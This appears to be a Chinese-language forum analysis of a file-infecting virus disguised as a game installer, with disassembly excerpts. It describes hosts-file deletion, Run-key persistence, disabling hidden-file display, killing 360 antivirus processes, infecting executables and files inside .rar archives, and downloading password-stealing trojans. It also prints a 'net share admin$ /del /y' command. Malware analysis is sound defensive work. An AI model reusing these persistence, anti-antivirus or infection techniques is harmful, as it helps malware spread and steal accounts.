
```asm
004070B6 |. 68 04724000 push 00407204 ; /heap32first
004070BB |. 8B03 mov eax, dword ptr [ebx] ; |
004070BD |. 50 push eax ; |hModule
004070BE |. E8 55FCFFFF call <jmp.&kernel32.GetProcAddress> ; \GetProcAddress
004070C3 |. A3 90364300 mov dword ptr [433690], eax
004070C8 |. 68 10724000 push 00407210 ; /heap32next
004070CD |. 8B03 mov eax, dword ptr [ebx] ; |
004070CF |. 50 push eax ; |hModule
004070D0 |. E8 43FCFFFF call <jmp.&kernel32.GetProcAddress> ; \GetProcAddress
004070D5 |. A3 94364300 mov dword ptr [433694], eax
004070DA |. 68 1C724000 push 0040721C ; /toolhelp32readprocessmemory
004070DF |. 8B03 mov eax, dword ptr [ebx] ; |
004070E1 |. 50 push eax ; |hModule
004070E2 |. E8 31FCFFFF call <jmp.&kernel32.GetProcAddress> ; \GetProcAddress
004070E7 |. A3 98364300 mov dword ptr [433698], eax
004070EC |. 68 38724000 push 00407238 ; /process32first
004070F1 |. 8B03 mov eax, dword ptr [ebx] ; |
004070F3 |. 50 push eax ; |hModule
004070F4 |. E8 1FFCFFFF call <jmp.&kernel32.GetProcAddress> ; \GetProcAddress
004070F9 |. A3 9C364300 mov dword ptr [43369C], eax
004070FE |. 68 48724000 push 00407248 ; /process32next
00407103 |. 8B03 mov eax, dword ptr [ebx] ; |
00407105 |. 50 push eax ; |hModule
00407106 |. E8 0DFCFFFF call <jmp.&kernel32.GetProcAddress> ; \GetProcAddress
0040710B |. A3 A0364300 mov dword ptr [4336A0], eax
00407110 |. 68 58724000 push 00407258 ; /process32firstw
00407115 |. 8B03 mov eax, dword ptr [ebx] ; |
00407117 |. 50 push eax ; |hModule
00407118 |. E8 FBFBFFFF call <jmp.&kernel32.GetProcAddress> ; \GetProcAddress
0040711D |. A3 A4364300 mov dword ptr [4336A4], eax
00407122 |. 68 68724000 push 00407268 ; /process32nextw
00407127 |. 8B03 mov eax, dword ptr [ebx] ; |
00407129 |. 50 push eax ; |hModule
0040712A |. E8 E9FBFFFF call <jmp.&kernel32.GetProcAddress> ; \GetProcAddress
0040712F |. A3 A8364300 mov dword ptr [4336A8], eax
00407134 |. 68 78724000 push 00407278 ; /thread32first
00407139 |. 8B03 mov eax, dword ptr [ebx] ; |
0040713B |. 50 push eax ; |hModule
0040713C |. E8 D7FBFFFF call <jmp.&kernel32.GetProcAddress> ; \GetProcAddress
00407141 |. A3 AC364300 mov dword ptr [4336AC], eax
00407146 |. 68 88724000 push 00407288 ; /thread32next
0040714B |. 8B03 mov eax, dword ptr [ebx] ; |
0040714D |. 50 push eax ; |hModule
0040714E |. E8 C5FBFFFF call <jmp.&kernel32.GetProcAddress> ; \GetProcAddress
00407153 |. A3 B0364300 mov dword ptr [4336B0], eax
00407158 |. 68 98724000 push 00407298 ; /module32first
0040715D |. 8B03 mov eax, dword ptr [ebx] ; |
0040715F |. 50 push eax ; |hModule
00407160 |. E8 B3FBFFFF call <jmp.&kernel32.GetProcAddress> ; \GetProcAddress
00407165 |. A3 B4364300 mov dword ptr [4336B4], eax
0040716A |. 68 A8724000 push 004072A8 ; /module32next
0040716F |. 8B03 mov eax, dword ptr [ebx] ; |
00407171 |. 50 push eax ; |hModule
00407172 |. E8 A1FBFFFF call <jmp.&kernel32.GetProcAddress> ; \GetProcAddress
00407177 |. A3 B8364300 mov dword ptr [4336B8], eax
0040717C |. 68 B8724000 push 004072B8 ; /module32firstw
00407181 |. 8B03 mov eax, dword ptr [ebx] ; |
00407183 |. 50 push eax ; |hModule
00407184 |. E8 8FFBFFFF call <jmp.&kernel32.GetProcAddress> ; \GetProcAddress
00407189 |. A3 BC364300 mov dword ptr [4336BC], eax
0040718E |. 68 C8724000 push 004072C8 ; /module32nextw
00407193 |. 8B03 mov eax, dword ptr [ebx] ; |
00407195 |. 50 push eax ; |hModule
00407196 |. E8 7DFBFFFF call <jmp.&kernel32.GetProcAddress> ; \GetProcAddress
0040719B |. A3 C0364300 mov dword ptr [4336C0], eax
004071A0 |> 833B 00 cmp dword ptr [ebx], 0
004071A3 |. 74 09 je short 004071AE
004071A5 |. 833D 84364300>cmp dword ptr [433684], 0
004071AC |. 75 04 jnz short 004071B2
004071AE |> 33C0 xor eax, eax
004071B0 |. 5B pop ebx
004071B1 |. C3 retn
004071B2 |> B0 01 mov al, 1
004071B4 |. 5B pop ebx
004071B5 \. C3 retn
```

## 2.2
删除 `C:\WINDOWS\system32\drivers\etc\hosts` 文件, 在 "`C:\WINDOWS\system32\drivers\`" 创建 "`TXPlatf0rmm.exe`" 并从 `cool_gamesetup.exe` 复制数据（病毒自身）写入 "`C:\WINDOWS\system32\drivers\TXPlatf0rmm.exe`" 文件。接着就是写入注册启动项，使“我的电脑->工具->文件夹选项->查看”中的“显示所有文件和文件夹功能”失效。以及加入启动项，关闭 `360` 安全卫士等。

```asm
0042713D |. 50 push eax
0042713E |. B9 E8714200 mov ecx, 004271E8 ; explorer
00427143 |. BA F4714200 mov edx, 004271F4 ; software\microsoft\windows\currentversion\run
00427148 |. B8 01000080 mov eax, 80000001
0042714D |. E8 5A03FEFF call 004074AC
00427152 |. 33C9 xor ecx, ecx
00427154 |. BA 2C724200 mov edx, 0042722C ;
software\microsoft\windows\currentversion\explorer\advanced\folder\hidden\showall\checkedvalue
00427159 |. B8 02000080 mov eax, 80000002
0042715E |. E8 39F7FEFF call 0041689C
00427163 |. B8 94724200 mov eax, 00427294 ; 360tray.exe
00427168 |. E8 8307FEFF call 004078F0
0042716D |. 84C0 test al, al
0042716F |. 75 0E jnz short 0042717F
00427171 |. B8 A8724200 mov eax, 004272A8 ; safeboxtray.exe
00427176 |. E8 7507FEFF call 004078F0
0042717B |. 84C0 test al, al
0042717D |. 74 16 je short 00427195
```

## 2.3
病毒会对文件进行过滤，排除一些文件和文件夹不感染。“`ntdetect.com，windows\winrar\winnt\system32\documents and settings\system volume\information\recycled\windows nt\windowsupdate\windows media\player\outlook express\internet explorer\netmeeting\common files complus applications\common files\messenger\installshield installation information\msn\microsoft frontpage\movie maker\msn gamin zone`”

## 2.4
设置定时器，用于执行感染写入, 病毒最可恶的是会将硬盘上备份在 `.rar` 文件包的文件解压到 "`c:\myrarwork`" 昨时文件夹，感染后再压缩回去!!! 感染后缀名为 `exe\scr\pif\com\htm\html\asp\php\jsp\aspx` 的文件。`exe` 文件被感染后，无法运行, 可能是病毒的 `bug`。病毒会在感染的文件夹下写入 `desktop\_1.ini`、`desktop\_2.ini`, 病毒的时间标志。

## 2.4
病毒运行后会运行调用 `cmd.exe /c net share admin$ /del /y` 等命令删除默认共享。

## 2.5
实现网络连接，病毒对自身的字符串进行了加密解密后网址为“[d2aK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3W2H3M7$3S2G2N6h3N6G2N6g2)9J5k6h3y4G2L8g2)9J5c8Y4c8B7i4K6u0W2K9s2c8E0i4@1f1J5i4K6R3H3i4K6W2p5大概是统计中马机器数量（我猜?）](https://bbs.kanxue.com/elink@3d9K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3W2H3M7$3S2G2N6h3N6G2N6g2)9J5k6h3y4G2L8g2)9J5c8Y4c8B7i4K6u0W2K9s2c8E0i4@1f1J5i4K6R3H3i4K6W2p5i4@1f1#2i4@1p5@1i4@1p5%4i4@1f1$3i4@1p5$3i4K6R3J5i4@1f1$3i4K6V1^5i4@1q4r3i4@1f1%4i4@1u0n7i4K6W2r3i4@1f1^5i4@1q4q4i4@1p5I4i4@1f1@1i4@1t1^5i4@1q4p5i4@1f1&6i4@1p5&6i4@1q4o6i4@1f1$3i4K6W2o6i4@1u0m8i4@1f1#2i4K6V1&6i4@1p5^5i4@1f1$3i4K6V1#2i4@1t1H3i4@1f1&6i4K6R3%4i4K6S2r3i4@1g2r3i4@1u0o6i4K6R3^5i4@1f1$3i4K6R3^5i4K6V1I4i4@1f1%4i4K6S2o6i4K6W2o6i4K6y4r3i4@1g2r3i4@1u0o6i4K6R3&6)

下载“[a9dK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3W2H3M7$3S2G2N6h3N6G2N6g2)9J5k6h3y4G2L8g2)9J5c8X3N6G2N6r3!0Q4x3V1k6V1L8%4N6F1i4K6u0W2N6s2S2@1i4@1f1J5i4K6R3H3i4K6W2p5，获取下载列表（7feK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4c8@1i4K6u0W2k6X3j5^5z5o6f1$3y4#2)9J5k6h3y4F1i4K6u0r3k6r3!0%4L8W2)9J5c8Y4q4I4L8h3q4Q4x3X3g2W2P5r3f1`.）后下载盗号木马。a79K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4x3@1x3#2)9J5k6h3y4F1P5Y4A6Q4x3X3g2U0L8$3#2Q4x3V1k6K6N6r3q4@1i4K6u0W2M7r3S2H3i4K6y4r3](https://bbs.kanxue.com/elink@1c2K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3W2H3M7$3S2G2N6h3N6G2N6g2)9J5k6h3y4G2L8g2)9J5c8X3N6G2N6r3!0Q4x3V1k6V1L8%4N6F1i4K6u0W2N6s2S2@1i4@1f1J5i4K6R3H3i4K6W2p5i4@1g2r3i4@1u0o6i4K6S2o6i4@1f1^5i4K6S2q4i4@1t1%4i4@1f1#2i4K6S2r3i4K6V1$3i4@1f1@1i4@1t1^5i4K6S2n7i4@1f1^5i4@1u0p5i4@1u0p5i4@1f1#2i4K6R3^5i4K6V1%4i4@1f1^5i4@1p5I4i4@1p5^5i4@1g2r3i4@1u0o6i4K6R3^5K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4c8@1i4K6u0W2k6X3j5^5z5o6f1$3y4#2)9J5k6h3y4F1i4K6u0r3k6r3!0%4L8W2)9J5c8Y4q4I4L8h3q4Q4x3X3g2W2P5r3g2Q4c8f1k6Q4b7V1y4Q4z5o6W2Q4c8e0g2Q4z5e0m8Q4z5p5g2Q4c8e0c8Q4b7U0S2Q4z5p5u0Q4c8e0S2Q4b7V1c8Q4b7V1c8Q4c8e0N6Q4z5f1u0Q4z5e0N6Q4c8e0g2Q4z5p5k6Q4b7U0N6Q4c8e0k6Q4z5f1y4Q4b7e0S2Q4c8e0W2Q4b7e0W2Q4b7f1y4Q4c8e0y4Q4z5o6m8Q4z5o6u0Z5N6s2c8H3i4K6y4m8i4K6u0r3i4K6u0r3M7K6b7K6i4K6u0W2j5$3&6*7P5W2)9J5k6h3y4G2L8g2)9J5c8Y4y4@1j5i4c8Q4x3X3g2H3K9s2m8Q4x3@1j5`.)
